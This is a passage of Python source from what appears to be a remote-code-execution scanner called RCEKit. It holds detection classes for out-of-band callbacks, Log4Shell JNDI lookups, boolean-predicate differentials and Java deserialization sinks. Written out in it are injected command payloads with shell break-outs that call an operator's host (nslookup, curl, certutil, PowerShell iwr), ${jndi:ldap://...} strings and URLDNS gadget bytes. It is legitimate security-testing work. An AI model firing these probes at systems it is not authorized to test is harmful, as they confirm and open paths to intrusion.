        # Digit boundaries: the product is a bare number, so fence it so it does
        # not match inside a longer digit run in the page.
        return self._confirm_computed(obs, probe, boundary=True)


class OobCallback(DetectionMethod):
    """Out-of-band confirmation for a target that returns nothing at all.

    A fully blind sink -- no command output in the response, no writable web
    root -- had no path to an ``executed`` verdict: ``time`` tops out at
    ``timing-sink`` by design, and ``file`` needs somewhere to write that the
    target also serves. This closes that gap by making the target reach *out*.

    Each probe carries its own random token and asks the target to resolve or
    fetch ``<token>.<oob-host>``; RCEKit's own listener (HTTP + DNS, started in
    process) records what arrives and correlates it back to the payload. A
    callback carrying a token the target could only have learned by running the
    command is proof of execution -- the same "the target produced something it
    could not have echoed" invariant the results-based methods use.

    The DNS probes matter more than the HTTP ones: egress filtering that blocks
    outbound HTTP usually still lets the resolver out, and a resolver-only path
    is often the only channel a hardened target has. One probe goes further and
    exfiltrates a *computed* value in the label -- ``$((a+b)).<token>....`` --
    so the callback proves the shell evaluated arithmetic, not merely that a
    hostname was resolved.

    Requires ``--oob-host``: an address the *target* can reach that resolves (or
    is delegated) to this listener. It makes the target open outbound
    connections, so it never runs unless the operator names that host."""
    name = "oob"
    tier = "executed"
    costly = True          # waits for a callback to arrive
    # It makes the target open outbound connections.
    safety = "intrusive"
    needs_oob_host = True
    uses_oob_host = True
    # The callbacks are asynchronous -- one can land well after the response
    # that triggered it -- so no probe can be judged until the whole batch has
    # been fired and the listener has been given time to collect.
    aggregate = True

    # token -> which probe shape produced it, and the value a computed-label
    # probe asked the target to evaluate. Reporting detail only.
    _shape: Dict[str, str] = {}
    _computed: Optional[int] = None
    # Whether any carrier has already been given the full callback window.
    _waited_once: bool = False

    def applicable(self, record: "PayloadRecord") -> bool:
        if not self.config.get("oob_host"):
            return False
        return record.environment in SHELL_CAPABLE_ENVIRONMENTS

    def _token(self, rng: "random.Random") -> str:
        # Lowercase letters and digits only: a DNS label is case-insensitive and
        # the listener correlates case-folded, so a mixed-case token would only
        # invite a 0x20-encoding resolver to mangle the comparison.
        return "rk" + "".join(rng.choice(string.ascii_lowercase + string.digits)
                              for _ in range(10))

    def build_probes(self, record: "PayloadRecord", rng: "random.Random") -> List[Probe]:
        host = str(self.config["oob_host"]).strip().rstrip(".")
        http_port = int(self.config.get("oob_http_port") or 80)
        sink_env = self._sink_env(record)
        port_suffix = "" if http_port == 80 else f":{http_port}"
        # A bare IP cannot carry a token as a DNS label -- there is nothing to
        # delegate and `<token>.10.0.0.1` resolves nowhere -- so the token rides
        # in the URL path instead, and the DNS shapes are skipped rather than
        # sent as probes that could never call back.
        ip_host = self._is_ip_literal(host)
        probes: List[Probe] = []
        # Per-instance, so probes built for one carrier do not inherit another's
        # bookkeeping through the class attribute.
        self._shape = dict(self._shape)

        listener = self.config.get("oob_listener")

        separators = self._separator_candidates(record, sink_env)

        def add(core_for_token, label: str):
            # A token per *separator*, not per shape. Sharing one token across
            # break-outs would mark every separator confirmed as soon as any one
            # of them called back -- and `cmd || curl` never runs when cmd
            # succeeds, so the report would name payloads that did nothing.
            for separator in separators:
                token = self._token(rng)
                core = core_for_token(token)
                body = core if separator is None else f"{separator}{core}"
                # The cmd.exe `powershell -c "..."` shape carries double quotes,
                # so a context that
                # wraps the payload in them cannot execute it.
                if self._context_swallows(record, body):
                    continue
                payload = self._wrap_context(record, body)
                probes.append(Probe(payload=payload, expected=token, separator=separator))
                self._shape[token] = label
                # Register the token with the listener, which correlates an
                # incoming callback by looking for a known token in the requested
                # host/path. Without this the hit arrives unattributable.
                if listener is not None:
                    listener.tokens[token] = {
                        "payload": payload, "category": "detection",
                        "context": record.context,
                    }

        def url_for(token: str) -> str:
            authority = host if ip_host else f"{token}.{host}"
            return f"http://{authority}{port_suffix}/{token}"

        if sink_env == "windows":
            if not ip_host:
                add(lambda t: f"nslookup {t}.{host}", "dns/nslookup")
            add(lambda t: f"certutil -urlcache -f {url_for(t)} %TEMP%\\{t}", "http/certutil")
            add(lambda t: f"powershell -c \"iwr -useb {url_for(t)}\"", "http/powershell")
        elif sink_env == "powershell":
            # Already in PowerShell, so `iwr` is called directly rather than
            # through a nested `powershell -c "..."` -- which is what the
            # cmd.exe shape needs and what puts the double quotes in it. Without
            # them this shape fits the quote-wrapping contexts too.
            if not ip_host:
                # nslookup, not Resolve-DnsName: the cmdlet lives in a
                # Windows-only module that a hardened or Core host may not have,
                # while nslookup is an executable present on every Windows
                # install and already proven by the cmd.exe shape.
                add(lambda t: f"nslookup {t}.{host}", "dns/nslookup")
            add(lambda t: f"iwr -useb {url_for(t)}", "http/iwr")
            if self._depth() != "quick":
                add(lambda t: f"curl.exe -s {url_for(t)}", "http/curl")
        else:
            if not ip_host:
                # DNS first: the resolver is the channel most likely to be open
                # when outbound HTTP is not.
                add(lambda t: f"nslookup {t}.{host}", "dns/nslookup")
                add(lambda t: f"host {t}.{host}", "dns/host")
                if self._depth() != "quick":
                    add(lambda t: f"ping -c 1 {t}.{host}", "dns/ping")
                    # Computed value in the label: the callback then proves the
                    # shell evaluated arithmetic, not merely that something
                    # resolved a name it was handed.
                    a, b = rng.randint(1000, 9999), rng.randint(1000, 9999)
                    self._computed = a + b
                    add(lambda t: f"nslookup $(({a}+{b})).{t}.{host}", "dns/computed")
            add(lambda t: f"curl -s {url_for(t)}", "http/curl")
            if self._depth() != "quick":
                add(lambda t: f"wget -q -O- {url_for(t)}", "http/wget")
        probes.extend(self._bridge_probes(record, sink_env, rng, url_for, ip_host, host, listener))
        return probes

    def _bridge_probes(self, record: "PayloadRecord", sink_env: str, rng: "random.Random",
                       url_for, ip_host: bool, host: str, listener) -> List[Probe]:
        """A callback command carried into the OS through a query language.

        The strongest bridge oracle. The arithmetic one needs the program's
        output to reach the response -- a statement injected alongside the
        application's own query returns through a cursor the application never
        reads -- while a callback is made by the target itself and needs nothing
        rendered at all."""
        probes: List[Probe] = []
        for name, _bridge in self._selected_bridges(sink_env):
            shapes = [(lambda t: f"curl -s {url_for(t)}", "http/curl")]
            if not ip_host:
                shapes.append((lambda t: f"nslookup {t}.{host}", "dns/nslookup"))
            if sink_env == "windows":
                shapes = [(lambda t: f"certutil -urlcache -f {url_for(t)} %TEMP%\\{t}",
                           "http/certutil")]
            for core_for_token, label in shapes:
                # A token per bridge *and* per shape: sharing one would mark
                # every bridge confirmed as soon as any one of them called back.
                token = self._token(rng)
                for built, payload, cleanup in self._bridge_variants(
                        record, core_for_token(token), sink_env, rng):
                    if built != name:
                        continue
                    probes.append(Probe(payload=payload, expected=token, carrier=name,
                                        separator=None,
                                        followup={"cleanup": cleanup} if cleanup else None))
                    self._shape[token] = f"{name}/{label}"
                    if listener is not None:
                        listener.tokens[token] = {
                            "payload": payload, "category": "detection",
                            "context": record.context,
                        }
        return probes

    @staticmethod
    def _is_ip_literal(host: str) -> bool:
        """Whether ``host`` is an address literal rather than a name. Only a
        name can carry a per-probe token as a DNS label."""
        if host.startswith("[") or ":" in host:
            return True  # IPv6 literal
        octets = host.split(".")
        return (len(octets) == 4
                and all(o.isascii() and o.isdigit() and int(o) < 256 for o in octets))

    def confirm_each(self, series: "List[Tuple[Probe, Observation]]"
                     ) -> "Optional[List[Tuple[Probe, Verdict]]]":
        """Wait for callbacks, then judge each probe by whether its own token
        arrived. Per-probe rather than one series verdict, so the report names
        the payload that actually reached the listener."""
        import time
        listener = self.config.get("oob_listener")
        wait = float(self.config.get("oob_wait", 6.0))
        out: List[Tuple[Probe, Verdict]] = []
        if listener is None:
            return [(probe, Verdict("error", "no OOB listener was started"))
                    for probe, _ in series]
        # The full window is only worth paying while a callback is still
        # plausible. Callbacks land in a burst once the channel works, so if not
        # one has arrived across every probe fired so far, this target is not
        # calling back and the remaining carriers need a grace period, not the
        # whole window. Without this the run slept `wait` seconds per carrier --
        # 30s of pure waiting on a clean target with the default carriers -- for
        # nothing. The first carrier always gets the full window, so a target
        # that does call back is never cut short before its first hit.
        if self._waited_once and not listener.hits:
            wait = min(wait, 1.5)
        self._waited_once = True
        deadline = time.time() + wait
        wanted = {probe.expected for probe, _ in series}
        while time.time() < deadline:
            if wanted <= {hit.get("token") for hit in listener.hits}:
                break
            time.sleep(0.25)
        received = {}
        for hit in listener.hits:
            received.setdefault(hit.get("token"), hit)
        for probe, obs in series:
            hit = received.get(probe.expected)
            if hit:
                shape = self._shape.get(probe.expected, "callback")
                detail = (f"target called back to the listener over {hit.get('proto')} "
                          f"carrying token {probe.expected!r} ({shape}) — execution proven "
                          "out of band")
                computed = getattr(self, "_computed", None)
                if computed is not None and str(computed) in (hit.get("host") or ""):
                    detail += f"; the callback label carries the computed value {computed}"
                out.append((probe, Verdict("executed", detail)))
            elif obs.status is None:
                out.append((probe, Verdict("error",
                                           f"request never reached the target ({obs.body[:120]})")))
            else:
                out.append((probe, Verdict("negative", "no callback for this probe's token")))
        return out

    def confirm_series(self, series: "List[Tuple[Probe, Observation]]") -> Verdict:
        # confirm_each carries the real logic; this only runs if an engine calls
        # the series form, and must agree with it.
        each = self.confirm_each(series) or []
        executed = [v for _, v in each if v.status == "executed"]
        if executed:
            return executed[0]
        return Verdict("negative", "no out-of-band callback received for any probe")


class LookupCallback(DetectionMethod):
    """Out-of-band confirmation for an **expression-lookup** sink -- the shape
    Log4Shell has, where the sink resolves a URI rather than running a command.

    ``oob`` cannot reach one. Its ``applicable`` does admit ``java`` -- a Java
    application can shell out, so the environment is genuinely shell-capable --
    but every probe it builds is a shell command: ``nslookup``, ``curl``,
    ``certutil``, ``iwr``. A sink that interpolates ``${jndi:...}`` runs none of
    them, so the method applies, sends its whole ladder, and comes back
    ``negative`` on a target that is exploitable. The README's Log4Shell row
    rested on the standalone listener and a generated payload file, which
    produce no verdict row at all, so nothing in the engine could reproduce that
    claim.

    The probes are lookups and nothing else, and they depend on the injection
    *context* rather than the environment, exactly as :class:`EvalExpr`'s do: a
    template that interpolates is not a shell.

    The oracle is the one :class:`OobCallback` already uses -- a token the
    target could only have learned by resolving what it was handed. The
    expression resolves ``<token>.<host>``, so RCEKit's own in-process DNS
    listener is the entire apparatus; no LDAP or RMI server is needed, and none
    is started.

    **``jndi:dns://`` is what the default rung sends, and that is a security
    property rather than a shortcut.** A name lookup can be nothing else.
    ``ldap://`` and ``rmi://`` continue *past* resolution and open a connection
    to whatever address the answer named -- by default ``127.0.0.1``, which is
    the target's own loopback. Whatever replies on :389 or :1099 is not RCEKit,
    so a reference could come back and a class be instantiated. That is a real
    difference in what the probe can cause, so it is a rung: those two ride at
    ``stateful`` and the operator chooses.

    They were briefly deleted instead, on the argument that ``dns://`` resolves
    wherever ``ldap://`` would. That claim was too strong. ``DnsContextFactory``
    does ship in the JDK, and 2.15.0 restricted the LDAP path while leaving
    ``dns:`` working -- but a filter that catches the string ``dns:`` and not
    ``ldap:``, or a trimmed runtime without the DNS provider, defeats it. A
    sink that takes one scheme and not the other is exactly the sink this
    method exists for.

    The proof is the callback, and the finding is "this sink resolved a URI I
    chose", which is what a lookup sink *is*. That is the same line ``deser``
    draws, drawn here before it can be crossed.

    Requires ``--oob-host``. Without it there are no probes, which is
    ``nothing-tested`` -- never ``negative``."""
    name = "lookup"
    costly = True          # waits for a callback to arrive
    oob_needs_dns_label = True
    uses_oob_host = True
    # Resolving a name is intrusive; fetching from an address RCEKit did not
    # choose is not, and rides at `stateful` on the probes that do it.
    safety = "intrusive"
    needs_oob_host = True
    # NOT `executed`. A callback proves the sink resolved a URI RCEKit chose --
    # that it evaluated the expression it was handed. It does not prove the
    # target ran attacker code: Log4Shell becomes RCE when the LDAP server
    # answers with a malicious class, and this listener answers with nothing.
    # `executed` is reserved for execution and has to stay that way to mean
    # anything, so this gets its own proven-sink tier beside
    # `deserialization-sink` -- the same distinction, drawn for the same reason.
    tier = "lookup-sink"
    # Not the execution question, so a candidate that has already proven
    # execution is still asked this one -- the sink has its own remediation.
    question = "lookup"
    # Callbacks are asynchronous: one can arrive well after the response that
    # triggered it, so no probe can be judged until the batch has been fired.
    aggregate = True

    # The one lookup scheme that cannot do anything but resolve a name, and so
    # the only one sent at `intrusive`.
    _SCHEMES = ("dns",)
    # These continue *past* resolution and open a connection to whatever address
    # the answer named, which is not an address RCEKit chose. That is a real
    # rung, not a reason to delete them: a sink that filters `dns:` but not
    # `ldap:` is exactly the sink this method exists for, and an operator
    # testing a disposable instance should be able to reach it.
    _STATEFUL_SCHEMES = ("ldap", "rmi")
    # The interpolation syntaxes a lookup sink may use. `${...}` is Log4j's and
    # JSP EL's; `#{...}` and `%{...}` are here because an expression evaluator
    # that refuses arithmetic may still resolve a URI, which is the case this
    # method exists for.
    _FORMS = ("${{{expr}}}", "#{{{expr}}}", "%{{{expr}}}")

    def __init__(self, gen: "RCEKit", config: Optional[Dict[str, Any]] = None):
        super().__init__(gen, config)
        # token -> the scheme that produced it, for the evidence line.
        self._scheme: Dict[str, str] = {}
        self._waited_once = False

    def applicable(self, record: "PayloadRecord") -> bool:
        # A lookup is an expression, not a command, so no environment is
        # excluded -- but without somewhere to call back there is nothing to
        # prove, and a probe that cannot confirm is a request wasted.
        return bool(self.config.get("oob_host"))

    def _token(self, rng: "random.Random") -> str:
        # Lowercase letters and digits only: a DNS label is case-insensitive and
        # the listener correlates case-folded, so a mixed-case token would only
        # invite a 0x20-encoding resolver to mangle the comparison.
        return "rk" + "".join(rng.choice(string.ascii_lowercase + string.digits)
                              for _ in range(10))

    def build_probes(self, record: "PayloadRecord", rng: "random.Random") -> List[Probe]:
        host = str(self.config["oob_host"]).strip().rstrip(".")
        # `OobCallback`'s test, not a copy of it. An address literal cannot
        # carry a token as a DNS label -- there is nothing to delegate, and
        # `<token>.10.0.0.1` resolves nowhere while `<token>.[::1]` is not even
        # a URL. A lookup has no second channel to put the token in the way an
        # HTTP probe does, so rather than send probes that could never be
        # attributed, send none. The private copy this replaces was a weaker
        # test: it missed IPv6 entirely and took `999.1.2.3` for an address.
        if OobCallback._is_ip_literal(host):
            return []
        listener = self.config.get("oob_listener")
        probes: List[Probe] = []
        for scheme in self._SCHEMES + self._STATEFUL_SCHEMES:
            rung = "stateful" if scheme in self._STATEFUL_SCHEMES else None
            for form in self._FORMS:
                token = self._token(rng)
                expr = "jndi:%s://%s.%s/a" % (scheme, token, host)
                payload = self._wrap_context(record, form.format(expr=expr))
                probes.append(Probe(payload=payload, expected=token, carrier=scheme,
                                    safety=rung))
                self._scheme[token] = scheme
                if listener is not None:
                    # Register with the listener, which correlates an incoming
                    # callback by looking for a known token in the queried name.
                    listener.tokens[token] = {
                        "payload": payload, "category": "detection",
                        "context": record.context,
                    }
        return probes

    def confirm_each(self, series: "List[Tuple[Probe, Observation]]"
                     ) -> "Optional[List[Tuple[Probe, Verdict]]]":
        import time

        listener = self.config.get("oob_listener")
        wait = float(self.config.get("oob_wait", 6.0))
        if listener is None:
            return [(probe, Verdict("error", "no OOB listener was started"))
                    for probe, _ in series]
        # Same grace rule as `oob`: the first carrier gets the full window, and a
        # target that has called back for nothing so far is not going to start on
        # the next carrier, so the rest get a grace period instead.
        if self._waited_once and not listener.hits:
            wait = min(wait, 1.5)
        self._waited_once = True
        deadline = time.time() + wait
        wanted = {probe.expected for probe, _ in series}
        while time.time() < deadline:
            if wanted <= {hit.get("token") for hit in listener.hits}:
                break
            time.sleep(0.25)
        received: Dict[Any, Any] = {}
        for hit in listener.hits:
            received.setdefault(hit.get("token"), hit)
        out: List[Tuple[Probe, Verdict]] = []
        for probe, obs in series:
            hit = received.get(probe.expected)
            if hit:
                scheme = self._scheme.get(probe.expected, "jndi")
                out.append((probe, Verdict(
                    "lookup-sink",
                    "target resolved a %s lookup RCEKit chose, calling back over %s with "
                    "token %r -- the sink evaluated the expression it was handed. The "
                    "listener served no object, so this proves the lookup, not a gadget "
                    "chain" % (scheme, hit.get("proto"), probe.expected))))
            elif obs.status is None:
                out.append((probe, Verdict(
                    "error", "request never reached the target (%s)" % obs.body[:120])))
            else:
                out.append((probe, Verdict("negative", "no callback for this probe's token")))
        return out

    def confirm_series(self, series: "List[Tuple[Probe, Observation]]") -> Verdict:
        # confirm_each carries the real logic; this only runs if an engine calls
        # the series form, and must agree with it.
        each = self.confirm_each(series) or []
        proven = [verdict for _, verdict in each if verdict.status == "lookup-sink"]
        if proven:
            return proven[0]
        return Verdict("negative", "no lookup callback received for any probe")


class BooleanDifferential(DetectionMethod):
    """A sink that **evaluates** a predicate and renders nothing of it.

    MongoDB ``$where`` is the shape this exists for, and this repository has
    carried the note for two releases: a JS sandbox that cannot reach a shell
    and returns no value, only a document set that a predicate narrows. Every
    shipped oracle is structurally blind to it -- ``reflected`` and ``eval``
    need the computed value rendered, ``time`` needs a sleep, ``oob`` needs
    egress. Measured against exactly that sink, ``--methods reflected,eval,time``
    put 2883 requests on the target and reported ``negative`` for every one of
    the 2426 results.

    So the channel here is the *shape of the response*, and the answer it
    carries is one bit. That makes this the weakest oracle in the tool, and
    this docstring is mostly about the ways it can lie.

    **It never reaches ``executed``, and the reason is not the obvious one.**
    The obvious reason is that no computed value reaches the response, so there
    is nothing reflection would be unable to forge. The real reason is worse:
    against a sandboxed ``eval`` sink and against a plain SQLite predicate,
    this oracle produced an identical clean differential in 40 runs each. It
    cannot tell *code executed* from *a query engine compared two numbers*, and
    the second is not RCE. Extracting a locally computed product bit by bit
    through the channel does not fix that -- it was tried, and recovered the
    product through both sinks alike, for about 80 requests and a string
    function a sandbox may well deny.

    That limit is about *which* evaluator, not about *whether* one ran. So the
    ceiling is ``evaluation-sink`` -- an evaluator consumed the input and
    partitioned on it, proven; which evaluator, not shown -- and there is no
    path from here to ``executed``. This reported ``needs-review`` for two
    releases, which named the tool's confidence instead of the target's
    behaviour and so read as a measurement that had not settled, when in fact
    every guard below holds in 100 runs of 100.

    **The naive form of this oracle is unusable**, which is why none of it is
    naive. Sending ``1==1`` against ``1==2`` and calling a changed response a
    finding reported "vulnerable" in 40 of 40 runs against a target that only
    *reflected* its input, and in 32 of 40 against one whose response merely
    wobbled. Four guards, each of which earned its place by measurement:

    * **A structural signature**, not the body and not its length. See
      :func:`response_shape`.
    * **Several independently randomised pairs**, not one. Against a target
      whose response varies on its own, one pair claimed a differential in 46
      of 200 runs; two claimed none in 200, and four claimed none in 200.
    * **Randomised firing order.** A target that never reads the payload but
      degrades part-way through a run -- a rate limiter, a filling log --
      splits an ordered true-then-false series perfectly. At the worst point of
      a swept degradation, an ordered series claimed a differential in 100 runs
      out of 100.
    * **An anchor before and after.** Shuffling alone left 2 in 100, which is
      just the chance a shuffle is still separable. Re-measuring the channel
      after the series caught it in 100 runs of 100, because a target that
      moved during the series cannot answer the closing anchor the way it
      answered the opening one -- provided the closing anchor is a *different*
      predicate, since a cache keyed on the query string would otherwise replay
      the opening answer and the check would measure the cache. With every
      guard on, a genuinely evaluating target still read as a differential in
      100 runs of 100 -- the guards cost nothing they were not meant to cost.
    """
    name = "boolean"
    tier = "evaluation-sink"
    aggregate = True
    # Nothing here sleeps, waits for a callback or fetches anything back: every
    # probe is one ordinary request. What makes it costly is that no single one
    # of them says anything. The answer is the partition across the whole
    # series, so the unit an operator pays for is 27 requests per context and
    # not one -- which is what the enumeration driver is asking when it runs
    # the cheap methods first. Reading the attribute the other way would put a
    # 27-request measurement in the wave that exists to be answered cheaply,
    # ahead of `reflected` and `eval`, and spending the same per-question
    # budget they do.
    costly = True
    safety = "safe"

    # The connectives a predicate breaks out of a condition the application
    # already wrote with, and the rung each needs. The split is measured rather
    # than cautious:
    #
    #   `AND` differentiates only when the application's own predicate is TRUE.
    #   `OR`  differentiates only when it is FALSE. They are complements, so
    #         dropping OR is a blind spot and not a saving.
    #
    #   A true predicate `OR`-ed into a `DELETE ... WHERE` took a table from 3
    #   rows to 0. The same predicate `AND`-ed into it left all 3.
    #
    # So OR ships -- a coverage hole is a false negative wearing a safety
    # label -- and it ships at the top rung, held back by default and named by
    # the pre-flight, because emptying a table is not an effect a notice can
    # take back.
    CONNECTIVES = (
        ("bare", "{expr}", "safe"),
        ("and", " && {expr}", "safe"),
        ("and-word", " and {expr}", "safe"),
        ("or", " || {expr}", "stateful"),
        ("or-word", " or {expr}", "stateful"),
    )

    # How many true/false pairs each connective gets. `quick` is 2 because 1
    # was measured to claim a differential on an ordinary noisy target in 23%
    # of runs; there is no rung below 2 that is honest, so --probe-depth trades
    # 4 for 2 and never for 1.
    PAIRS = {"quick": 2, "full": 4}
    MIN_PAIRS = 2

    def __init__(self, gen: "RCEKit", config: Optional[Dict[str, Any]] = None):
        super().__init__(gen, config)
        # Contexts already measured in this run. A predicate carries no shell
        # dialect, so the probes for `unix` and for `windows` in the same
        # context are the same bytes -- and the aggregate branch, unlike the
        # per-probe one, has no payload de-duplication to notice. Without this
        # the whole series is refired once per environment, to ask a question
        # whose answer cannot differ.
        self._contexts_done: Set[str] = set()

    def applicable(self, record: "PayloadRecord") -> bool:
        """Contexts that carry the value *as a value*.

        Where the injected input is code -- a statement the context breaks out
        into, or the command itself -- a bare comparison has no observable
        effect, so the probe would be spent asking nothing. The break-out this
        method needs is a boolean connective, which it supplies itself and
        which is the axis ``CONNECTIVES`` runs along."""
        return record.context not in CODE_POSITION_CONTEXTS

    def _pairs(self) -> int:
        return self.PAIRS.get(self._depth(), self.PAIRS["full"])

    def _predicate(self, rng: "random.Random", truth: bool) -> str:
        """``a*b==P``, where ``P`` is the product when ``truth`` and a different
        number *of the same length* when not.

        Matched lengths, so a validator that rejects long values or a filter
        that counts characters cannot answer in the target's place. Matched
        syntax for the same reason: both forms parse or neither does, so a sink
        that merely rejects what it cannot parse never splits the series."""
        a = rng.randint(1000, 9999)
        b = rng.randint(1000, 9999)
        product = a * b
        if truth:
            return f"{a}*{b}=={product}"
        digits = len(str(product))
        low, high = 10 ** (digits - 1), 10 ** digits - 1
        wrong = product
        while wrong == product:
            wrong = rng.randint(low, high)
        return f"{a}*{b}=={wrong}"

    def build_probes(self, record: "PayloadRecord", rng: "random.Random") -> List[Probe]:
        if record.context in self._contexts_done:
            return []
        self._contexts_done.add(record.context)
        pairs = self._pairs()

        def probe(payload: str, phase: str, carrier: Optional[str] = None,
                  safety: Optional[str] = None) -> Probe:
            return Probe(payload=payload, expected="", phase=phase,
                         carrier=carrier, safety=safety)

        body: List[Probe] = []
        for name, form, rung in self.CONNECTIVES:
            for _ in range(pairs):
                for truth in (True, False):
                    payload = form.format(expr=self._predicate(rng, truth))
                    body.append(probe(self._wrap_context(record, payload),
                                      "yes" if truth else "no", name,
                                      None if rung == self.safety else rung))
        # The order is a guard, not presentation. Fired as built -- every true,
        # then every false -- a target that simply degrades part-way through
        # answers the two halves differently, and the series reads as a perfect
        # finding.
        rng.shuffle(body)
        # Two anchors before and one after. The opening pair says whether the
        # channel is steady enough to carry one bit at all; the closing one
        # says whether it stayed that way while the series was fired.
        #
        # Three *different* true predicates, not one sent three times. A cache
        # keyed on the query string answers a repeated payload from its store,
        # so identical anchors are one live request and two replays of it --
        # and the closing anchor then agrees with the opening one whatever the
        # target did in between. Measured against an input-blind target that
        # degrades mid-series, identical anchors caught it in 36 of 39 runs
        # live and in 0 of 39 behind a cache. Distinct payloads are each a live
        # request, so the check measures the target rather than the cache; they
        # are all true, so on a sink that evaluates them they carry the same
        # shape exactly as one repeated probe would.
        anchors = [self._wrap_context(record, self._predicate(rng, True))
                   for _ in range(3)]
        opening = [probe(payload, "anchor-open") for payload in anchors[:2]]
        return opening + body + [probe(anchors[2], "anchor-close")]

    def confirm_series(self, series: "List[Tuple[Probe, Observation]]") -> Verdict:
        shapes = [(probe, response_shape(obs.status, obs.body))
                  for probe, obs in series if obs.status is not None]
        if not shapes:
            return Verdict("error", "no probe reached the target")
        opening = [shape for probe, shape in shapes if probe.phase == "anchor-open"]
        closing = [shape for probe, shape in shapes if probe.phase == "anchor-close"]
        # `inconclusive` and never `negative` for a channel that cannot be read.
        # The probes arrived; what the run failed to do was read an answer out
        # of them, and "the target is clean" is not what that means.
        if len(opening) < 2 or len(set(opening)) != 1:
            return Verdict("inconclusive",
                           "two predicates that are both true drew different response "
                           "shapes, so this channel cannot carry a one-bit answer")
        if not closing or set(closing) != set(opening):
            return Verdict("inconclusive",
                           "the response shape moved while the series was being fired, so a "
                           "difference between probes is not attributable to the predicate")
        for name, _form, _rung in self.CONNECTIVES:
            sent = [(probe, shape) for probe, shape in shapes if probe.carrier == name]
            true_probes = [shape for probe, shape in sent if probe.phase == "yes"]
            false_probes = [shape for probe, shape in sent if probe.phase == "no"]
            yes, no = set(true_probes), set(false_probes)
            # Fewer pairs than the floor is not a weaker answer, it is the
            # answer the measurement rejected: at one pair an ordinary noisy
            # target read as a finding in 23% of runs. A connective the profile
            # or the rung thinned below the floor is skipped, not graded down.
            #
            # Counted on each side rather than across both. A connective left
            # with three true probes and one false one clears a floor on the
            # total, and then `len(no) == 1` holds because there is only one
            # false sample to disagree with itself -- which is the single-pair
            # answer arriving by the back door, on the half that matters most.
            if min(len(true_probes), len(false_probes)) < self.MIN_PAIRS:
                continue
            if len(yes) == 1 and len(no) == 1 and yes != no:
                return Verdict(
                    "evaluation-sink",
                    f"the response shape partitioned exactly along "
                    f"{min(len(true_probes), len(false_probes))} "
                    f"randomised true/false predicates via the {name} connective, and held "
                    "its shape across anchors either side -- an evaluator consumed the "
                    "input. Which evaluator is not shown: a query engine comparing two "
                    "numbers produces this same differential, so it is not execution")
        return Verdict("negative", "no response-shape differential tracked the predicate")


# The detection methods RCEKit can run, keyed by their --methods name. Adding a
# phase = adding a class above and an entry here.
class DeserSink(DetectionMethod):
    """Proves an endpoint **deserializes attacker-controlled data**, and stops there.

    Deserialization RCE (fastjson, shiro, weblogic, jenkins) cannot be confirmed
    by the value-oracle model: the payload is a serialized object graph and
    gadget selection is classpath-specific, so whether execution is reachable
    depends on jars RCEKit cannot see. That is genuinely out of scope. What is
    *in* scope is the honest middle step -- showing the endpoint parses the data
    at all, which is a real, reportable finding and the prerequisite for every
    gadget chain.

    So this method never emits ``executed``. Its strongest outcome is its own
    verdict, ``deserialization-sink``, and the report says outright that
    reaching RCE from there depends on classpath gadgets. Collapsing it into
    ``executed`` would break the one guarantee the whole tool rests on;
    collapsing it into ``needs-review`` would throw away a proven finding.

    Two oracles, of deliberately different strength:

    * **shape** (safe, no listener) -- a differential across four payloads: a
      well-formed object stream, the same stream truncated, and the format's
      magic bytes followed by noise, that last one sent twice so it brackets the
      pair. A parser distinguishes the well-formed one; a parameter that is
      merely stored treats all of them as opaque text. That is a fingerprint,
      not proof, so it reaches ``needs-review`` only.

      Four rather than three, and the arithmetic is worth stating because an
      operator on a monitored engagement plans from it: with the five
      ecosystems the corpus ships this is 20 requests per carrier, not 15.
      ``--deser-formats`` narrows it.

      The two noise payloads are one body sent twice, byte for byte. The
      differential is read *across* requests, so anything changing with the
      request index rather than with the payload lands on whichever form goes
      last; an endpoint answering the same probe two different ways did not hold
      still, and that carrier is reported ``inconclusive`` rather than read. A
      response carrying the probe back is ``inconclusive`` for the same reason,
      decided against the payload-free control so that page content merely
      containing a format's magic is not mistaken for reflection.
    * **dns** (needs ``--oob-host``) -- a non-executing gadget whose only side
      effect is a name lookup: URLDNS for Java serialization, an
      ``Inet4Address`` autotype for polymorphic JSON. A callback proves the
      object graph was reconstructed. That reaches ``deserialization-sink``.
    """
    name = "deser"
    tier = "deserialization-sink"
    costly = True          # its DNS gadget waits for a callback
    oob_needs_dns_label = True
    # Its DNS gadget calls back, so a listener has to be up for it -- but the
    # shape oracle proves something without one, so the run must not stop when
    # no host is named. That is the whole reason these are two attributes.
    uses_oob_host = True
    # The shape oracle needs no listener and changes nothing, so the method
    # itself sits at `safe`.
    #
    # Its DNS gadget does make the target resolve a name, which is the very
    # thing `oob` and `lookup` are refused for at this rung. It is not held
    # back for it -- that would send fewer probes at the default tier, and
    # reach wins where the two pull against each other. It declares
    # `reaches_past="intrusive"` instead, so the probe goes and the run says
    # it went. A resolution is a request the target makes and nothing more.
    safety = "safe"
    also_reports = ("needs-review",)
    # Its own question, for the same reason `lookup` has one: a classpath gadget
    # chain is a different remediation from a command sink, so proving execution
    # elsewhere never answers this.
    question = "deserialization"
    aggregate = True

    SHAPE_FORMS = ("wellformed", "truncated", "noise", "noise_again")

    # --- Java serialization ------------------------------------------------
    #
    # Emitted as bytes rather than declared in the corpus because the URL host
    # is length-prefixed *inside* the stream and changes for every probe, so
    # there is no static string to declare. Everything except the host is
    # constant, and the constants below are the exact bytes OpenJDK's own
    # ObjectOutputStream produces for HashMap{URL: String} -- diffed against a
    # real JVM's output, byte for byte, up to the one place Java back-references
    # the repeated host string where this writes a fresh copy (equivalent for
    # the reader, and simpler here).
    _JAVA_HASHMAP = (
        b"\xac\xed\x00\x05"                          # STREAM_MAGIC, version 5
        b"\x73\x72\x00\x11java.util.HashMap"
        b"\x05\x07\xda\xc1\xc3\x16\x60\xd1"      # serialVersionUID
        b"\x03\x00\x02"                              # SERIALIZABLE, 2 fields
        b"\x46\x00\x0aloadFactor"
        b"\x49\x00\x09threshold"
        b"\x78\x70"
        b"\x3f\x40\x00\x00"                          # loadFactor 0.75f
        b"\x00\x00\x00\x0c"                          # threshold 12
        b"\x77\x08\x00\x00\x00\x10\x00\x00\x00\x01"  # capacity 16, size 1
    )
    _JAVA_URL_DESC = (
        b"\x73\x72\x00\x0cjava.net.URL"
        b"\x96\x25\x37\x36\x1a\xfc\xe4\x72"
        b"\x03\x00\x07"
        b"\x49\x00\x08hashCode"
        b"\x49\x00\x04port"
        b"\x4c\x00\x09authority\x74\x00\x12Ljava/lang/String;"
        b"\x4c\x00\x04file\x71\x00\x7e\x00\x03"
        b"\x4c\x00\x04host\x71\x00\x7e\x00\x03"
        b"\x4c\x00\x08protocol\x71\x00\x7e\x00\x03"
